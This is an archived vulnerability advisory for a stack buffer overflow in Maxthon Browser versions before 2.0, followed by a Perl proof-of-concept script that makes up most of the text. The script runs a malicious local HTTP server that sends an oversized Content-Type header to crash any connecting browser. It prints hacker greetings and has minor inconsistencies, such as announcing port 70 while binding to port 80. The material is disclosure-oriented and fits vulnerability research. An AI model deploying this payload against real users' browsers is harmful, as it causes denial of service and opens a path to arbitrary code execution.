source: http://www.securityfocus.com/bid/30617/info

Maxthon Browser is prone to a buffer-overflow vulnerability.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Versions prior to Maxthon Browser 2.0 are vulnerable. 

#!/usr/bin/perl  # Maxthon Browser << 2.0 Stack Overflow Crash  # Descoverd by DATA_SNIPER  # Usage:   #connect from maxthon browser to http:/127.0.0.1/
use IO::Socket;
my $sock=new IO::Socket::INET (
Listen    => 1,
                                
LocalAddr => 'localhost',
                                
LocalPort => 80,
                               
Proto     =>
 'tcp');  die unless $sock;
$huge="A" x 1100000;
$|=1;  print "===================================================================\n";
print " Mawthon Browser << 2.0 Stack Overflow Crash\n";
print "               Bug Descoverd by DATA_SNIPER\n";
print " GreetZ To:Alpha_Hunter,Pirat Digital,Xodia,DelataAzize,AT4RE Team,all algerian hackers\n";
print "               Mail me at:Alpha_three3333(at)yahoo(dot)com\n";  print "   BigGreetZ To: www.at4re.com,www.crownhacker.com\n";
print"===================================================================\n";  print " [+] HTTP Server started on port 70... \n";
print" [+]Try IExplore http://127.0.0.1/ \n";
$z=$sock->accept();  print " [+]connection
 Accepted!\n";
do
{
 $ln=<$z>;
 
print $ln;
 chomp $ln;
 
 if (($ln eq "")||($ln eq "\n")||($ln eq "\r"))
 {
  
print " [<>]Sending Evil Packet\n";
  
print $z " HTTP/1.1 200 OK\r\nServer: bugs 3.1.02\r\nContent-Type: $huge\r\nConnection: close\r\n\r\ndone";
  
close($z);
  
exit;
 
}
} while (true);